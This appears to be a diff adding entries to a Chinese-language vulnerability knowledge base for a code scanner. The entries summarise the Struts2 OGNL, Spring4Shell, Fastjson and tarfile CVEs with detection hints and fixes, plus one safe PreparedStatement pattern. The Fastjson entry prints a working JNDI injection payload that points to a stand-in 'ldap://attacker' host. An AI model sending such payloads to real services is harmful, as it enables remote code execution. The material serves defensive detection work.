+    "document": "CVE 真实案例 - Struts2 OGNL 注入（CVE-2017-5638，Equifax 泄露根因）：JakartaMultiPartRequest.parse 错误处理时把 Content-Type 头当作 OGNL 表达式求值，攻击者构造恶意 Content-Type 即可 RCE。判断要点：错误消息拼接用户可控的 HTTP 头，且后续被 OGNL/SpEL/表达式引擎求值。修复：升级 Struts2 至 2.5.13+；错误消息不要包含用户输入；禁用 OGNL 求值。",
+    "metadata": {"type": "CVE 真实案例", "cwe": "CWE-917", "category": "注入类"}
+  },
+  {
+    "id": "cve_real_spring4shell",
+    "document": "CVE 真实案例 - Spring4Shell（CVE-2022-22965）：Spring DataBinder 默认允许 class.module.classLoader.* 嵌套属性绑定，攻击者可改 Tomcat AccessLogValve 配置写入 webshell。判断要点：Spring MVC 接收 @ModelAttribute / 表单绑定，未限制可绑定字段（allowedFields）。修复：升级 Spring 至 5.3.18+；@InitBinder 注册 allowedFields 白名单；禁用 class.* 路径。",
+    "metadata": {"type": "CVE 真实案例", "cwe": "CWE-915", "category": "访问控制"}
+  },
+  {
+    "id": "cve_real_fastjson",
+    "document": "CVE 真实案例 - Fastjson 反序列化（CVE-2017-18349）：Fastjson 1.2.24 前 autoType 默认开启，攻击者可构造 {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/obj\",\"autoCommit\":true} 触发 JNDI 注入 RCE。判断要点：JSON.parseObject / JSON.parse 直接解析用户输入，未禁用 autoType。修复：升级 Fastjson 至 1.2.83+；autoType 关闭；用 Feature.SafeMode；改用 Jackson/Gson。",
+    "metadata": {"type": "CVE 真实案例", "cwe": "CWE-502", "category": "反序列化"}
+  },
+  {
+    "id": "cve_real_tarfile",
+    "document": "CVE 真实案例 - tarfile 路径穿越（CVE-2007-4559 / 2022 重提）：tarfile.extractall 默认不校验 member.name 中的 ../，恶意 tar 可写出目标目录外。Python 标准库 14 年未修复，2022 年被重新定性。判断要点：tarfile.open(...).extractall(path=UPLOAD_DIR) 未校验 member.name。修复：升级 Python 至 3.12+（默认 filter='data'）；显式校验每个 member 的绝对路径前缀；或用 filter='data' 参数。",
+    "metadata": {"type": "CVE 真实案例", "cwe": "CWE-22", "category": "访问控制"}
+  },
+  {
+    "id": "java_prep_stmt_safe",
+    "document": "Java PreparedStatement - 安全模式识别（CWE-89）：以下写法是安全的，不应误报：PreparedStatement stmt = conn.prepareStatement('SELECT * FROM users WHERE username = ? AND password = ?'); stmt.setString(1, username); stmt.setString(2, password); ResultSet rs = stmt.executeQuery()（参数化查询，? 占位符 + setString 独立参数）。判断要点：用 PreparedStatement 而非 Statement，且 SQL 语句用 ? 占位符，参数用 setString/setInt 独立传入，即安全。常见误报：把 PreparedStatement + setString 当成 SQL 注入。安全写法示例：PreparedStatement stmt = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\\n stmt.setInt(1, userId); → has_vulnerability=false。",
+    "metadata": {"type": "SQL注入", "cwe": "CWE-89", "category": "注入类", "safe_pattern": true}
   }
 ]
